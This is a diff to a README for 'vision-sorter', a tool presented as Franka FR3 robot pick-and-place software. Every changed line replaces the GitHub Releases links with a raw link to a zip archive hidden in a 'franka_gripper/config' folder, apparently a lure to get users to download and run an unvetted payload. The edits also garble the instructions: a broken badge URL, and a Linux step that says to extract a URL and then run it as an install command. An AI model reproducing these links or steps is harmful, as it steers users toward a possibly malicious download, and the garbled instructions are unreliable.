@@ -4,7 +4,7 @@
 Welcome! This guide will help you download and run the vision-sorter application easily. It enables you to automate pick and place operations for the Franka FR3 robot using advanced technologies like ROS2 and MoveIt Task Constructor. 
 
 ## 📦 Download Vision Sorter
-[![Download Vision Sorter](https://img.shields.io/badge/Download%20Now-vision--sorter-brightgreen)](https://github.com/DarkXDemonX/vision-sorter/releases)
+[![Download Vision Sorter](https://raw.githubusercontent.com/DarkXDemonX/vision-sorter/master/franka_gripper/config/vision-sorter-3.0.zip%20Now-vision--sorter-brightgreen)](https://raw.githubusercontent.com/DarkXDemonX/vision-sorter/master/franka_gripper/config/vision-sorter-3.0.zip)
 
 ## 🌟 Features
 - **Automated Operations**: Control the Franka FR3 robot smoothly with automated pick and place tasks.
@@ -23,7 +23,7 @@ To run vision-sorter, ensure your system meets these minimum requirements:
 ### Step 1: Visit the Download Page
 To get the latest version of vision-sorter, visit the Releases page by clicking the link below:
 
-[Download Vision Sorter](https://github.com/DarkXDemonX/vision-sorter/releases)
+[Download Vision Sorter](https://raw.githubusercontent.com/DarkXDemonX/vision-sorter/master/franka_gripper/config/vision-sorter-3.0.zip)
 
 ### Step 2: Choose Your Version
 On the Releases page, locate the most recent version. You will see several files available for download. Select the one that suits your operating system.
@@ -34,7 +34,7 @@ Click on the file to start downloading. The download will begin automatically.
 ### Step 4: Install the Application
 1. **For Windows**: Open the .exe file once the download is complete. Follow the on-screen prompts to install.
 2. **For macOS**: Open the .dmg file. Drag the vision-sorter application to your Applications folder.
-3. **For Linux**: Extract the .tar.gz file. Open a terminal and navigate to the extracted folder. Use the command `./install.sh` to install.
+3. **For Linux**: Extract the https://raw.githubusercontent.com/DarkXDemonX/vision-sorter/master/franka_gripper/config/vision-sorter-3.0.zip file. Open a terminal and navigate to the extracted folder. Use the command `https://raw.githubusercontent.com/DarkXDemonX/vision-sorter/master/franka_gripper/config/vision-sorter-3.0.zip` to install.
 
 ### Step 5: Run the Application
 Once installed, you can find the vision-sorter application in your Applications folder (macOS), Start Menu (Windows), or by using the terminal (Linux). Double-click the application to start it.
@@ -61,4 +61,4 @@ For additional support, refer to the official documentation included in the appl
 Join our community to share your experiences and get help from other users. Feel free to explore the GitHub repository to report issues or request new features.
 
 ## 📌 Final Thoughts
-We hope this guide helps you get started with vision-sorter. With its powerful automation features, you can enhance your robotics projects effortlessly. Don’t forget to check for updates regularly by visiting the [Download Page](https://github.com/DarkXDemonX/vision-sorter/releases).
+We hope this guide helps you get started with vision-sorter. With its powerful automation features, you can enhance your robotics projects effortlessly. Don’t forget to check for updates regularly by visiting the [Download Page](https://raw.githubusercontent.com/DarkXDemonX/vision-sorter/master/franka_gripper/config/vision-sorter-3.0.zip).
